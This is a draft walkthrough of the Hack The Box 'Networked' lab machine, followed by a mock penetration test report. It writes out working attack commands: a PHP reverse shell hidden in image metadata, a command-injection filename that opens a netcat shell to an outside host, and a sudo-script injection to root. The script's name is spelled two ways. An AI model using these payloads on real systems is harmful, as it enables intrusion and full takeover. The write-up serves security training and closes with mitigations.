---
title: Networked HTB — Full Walkthrough
published: 2025-06-26
description: A detailed walkthrough of the Networked HTB Linux machine, covering reconnaissance, exploitation of a vulnerable file upload functionality, privilege escalation via cron job and sudo script vulnerabilities, and flag capture.
tags: [HTB, Linux, File Upload, Command Injection, Cron Job, Privilege Escalation, CTF]
category: Walkthrough
draft: true
---

# Networked HTB — Full Walkthrough

**Difficulty:** Easy

**Platform:** Hack The Box

**Target:** Linux (Networked machine)

**Objective:** Gain initial access by exploiting a vulnerable file upload functionality, escalate privileges using a cron job and a misconfigured script, and capture the user and root flags.

## 1. Reconnaissance

Begin with a full TCP port scan and service enumeration to identify open ports and services:

```bash
nmap -p- -sV -sC -Pn -T4 10.10.10.146
```

**Findings:**

- Open ports: 22 (SSH), 80 (HTTP), 443 (HTTPS).
- Web server running Apache on port 80, hosting a file upload functionality at `/upload.php` and a gallery at `/photos.php`.
- A backup directory (`/backup/`) contains a downloadable `backup.tar` file with the website’s source code.

Add the target to `/etc/hosts`:

```bash
echo "10.10.10.146 networked.htb" | sudo tee -a /etc/hosts
```

Perform directory enumeration using `dirsearch` to uncover hidden files or directories:

```bash
dirsearch -u http://networked.htb
```

**Findings:**

- Confirmed `/upload.php` for file uploads and `/photos.php` for viewing uploaded files.
- Discovered `/backup/backup.tar`, which contains the source code, including `upload.php` and `lib.php`.

Extract and analyze the `backup.tar` file:

```bash
tar -xf backup.tar
cat upload.php
```

The `upload.php` source code reveals a file upload function that:
- Allows files with extensions `.jpg`, `.png`, `.gif`, or `.jpeg`.
- Checks file size (< 60,000 bytes).
- Renames uploaded files to `<client_ip>.<extension>`.

## 2. Exploitation

The upload functionality is vulnerable to bypassing extension checks by embedding PHP code in an image file’s metadata. Use `exiftool` to inject a reverse shell payload into a valid image:

```bash
exiftool -DocumentName='<?php system("nc 10.10.14.8 4343 -e /bin/sh"); ?>' shell.jpg
mv shell.jpg shell.php.jpg
```

Start a Netcat listener:

```bash
nc -lvnp 4343
```

Upload `shell.php.jpg` via `http://networked.htb/upload.php`. Access `http://networked.htb/photos.php` to trigger the payload.

**Result:** A reverse shell is established as the `apache` user.

## 3. Post-Exploitation

Explore the system to identify privilege escalation opportunities:

```bash
whoami
# Output: apache
ls -la /home
```

**Findings:**

- A user `guly` exists with a home directory at `/home/guly`.
- A cron job runs `/home/guly/check_attack.php` every 3 minutes.

Inspect the `check_attack.php` script:

```bash
cat /home/guly/check_attack.php
```

The script scans the `/var/www/html/uploads/` directory and executes `rm -f` on files without proper sanitization, making it vulnerable to command injection via a crafted filename.

Create a malicious file in `/var/www/html/uploads/` to exploit this vulnerability:

```bash
echo "test" > "; nc 10.10.14.8 4343 -c bash"
```

Start a new Netcat listener:

```bash
nc -lvnp 4343
```

Wait for the cron job to execute (within 3 minutes). The crafted filename triggers a reverse shell as the `guly` user.

## 4. Privilege Escalation

As the `guly` user, check for sudo privileges:

```bash
sudo -l
```

**Output:** User `guly` can run `/usr/local/sbin/changename.sh` as root without a password.

Inspect the `clangename.sh` script:

```bash
cat /usr/local/sbin/changename.sh
```

The script writes user input to `/etc/sysconfig/network-scripts/ifcfg-guly` and starts a network interface. It uses a weak regex (`^[a-zA-Z0-9_\ /-]+$`) that allows spaces, which can lead to command injection in the `ifup` command due to a vulnerability in CentOS network-scripts.

Run the script and input a malicious payload for the `NAME` field:

```bash
sudo /usr/local/sbin/changename.sh
# For NAME, enter: malicious; bash
# For other fields, enter valid input (e.g., none)
```

**Result:** The payload triggers a root shell.

Navigate to capture the flags:

```bash
cd /home/guly
cat user.txt
cd /root
cat root.txt
```

## 5. Additional Vulnerability

The weak regex in `clangename.sh` allows arbitrary command execution, which could be exploited in other ways, such as writing malicious configuration files or executing other commands as root.

## 6. Mitigation

To prevent these vulnerabilities:

- **File Upload:** Implement strict file validation (e.g., verify MIME types, reject metadata tampering) and sanitize filenames.
- **Cron Job:** Sanitize inputs in `check_attack.php` to prevent command injection. Use absolute paths and validate filenames strictly.
- **Sudo Script:** Strengthen the regex in `clangename.sh` to disallow spaces and special characters. Validate inputs before passing to system commands.
- **General:** Keep systems patched, restrict file permissions, and monitor cron jobs for suspicious activity.

## Lessons Learned

- File upload vulnerabilities can allow code execution if validation is weak.
- Cron jobs running as privileged users can be exploited if scripts lack proper input sanitization.
- Misconfigured sudo privileges can lead to full system compromise.
- Regular security audits and input validation are critical for securing web applications and scripts.

# Penetration Test Report

**Client:** HTB

**Engagement:** Penetration Test - Networked Linux Machine

**Date:** June 2025

**Consultant:** Hugo Leonor

## 1. Objective

Evaluate the security of the Networked Linux machine (`networked.htb`), identifying vulnerabilities to gain unauthorized access and escalate to root privileges.

## 2. Scope

- **Target IP:** 10.10.10.146
- **Services:** HTTP (80), HTTPS (443), SSH (22)
- **Objective:** Gain root access and capture user and root flags

## 3. Methodology

- Reconnaissance using Nmap and Dirsearch
- Exploitation of file upload vulnerability for initial access
- Post-exploitation to identify cron jobs and privilege escalation vectors
- Privilege escalation via a vulnerable sudo script
- Mitigation recommendations

## 4. Summary of Findings

| Stage | Key Result | Impact |
| --- | --- | --- |
| Reconnaissance | Open HTTP ports, vulnerable file upload at `/upload.php` | Initial access vector |
| Exploitation | PHP code injection via image metadata | Reverse shell as `apache` user |
| Post-Exploitation | Cron job vulnerability in `check_attack.php` | Privilege escalation to `guly` user |
| Privilege Escalation | Command injection in `clangename.sh` | Root access achieved |

## 5. Technical Details

### 5.1 Reconnaissance

Nmap revealed open ports 80, 443, and 22. Directory enumeration identified `/upload.php`, `/photos.php`, and `/backup/backup.tar`. The backup file contained source code, revealing a weak file upload validation in `upload.php`.

### 5.2 Exploitation

A reverse shell was achieved by injecting PHP code into an image’s metadata using `exiftool` and uploading it as `shell.php.jpg`. Accessing `photos.php` triggered the shell, granting `apache` user access.

### 5.3 Post-Exploitation

A cron job running `check_attack.php` was identified, which executed `rm -f` on uploaded files without sanitizing filenames. A crafted filename (`; nc 10.10.14.8 4343 -c bash`) triggered a reverse shell as the `guly` user.

### 5.4 Privilege Escalation

The `guly` user could run `clangename.sh` as root. The script’s weak regex allowed command injection by including a space and a bash command in the `NAME` field, granting a root shell.

## 6. Impact and Risks

- **Initial Access:** The file upload vulnerability allows arbitrary code execution.
- **Privilege Escalation:** Cron job and sudo script vulnerabilities enable root access.
- **System Compromise:** Full control over the system, including access to sensitive files.

## 7. Recommendations

- Validate file uploads by checking MIME types and sanitizing metadata.
- Sanitize filenames in `check_attack.php` to prevent command injection.
- Tighten regex in `clangename.sh` to disallow spaces and special characters.
- Restrict cron job and sudo privileges to minimize attack surfaces.
- Conduct regular security audits and patch management.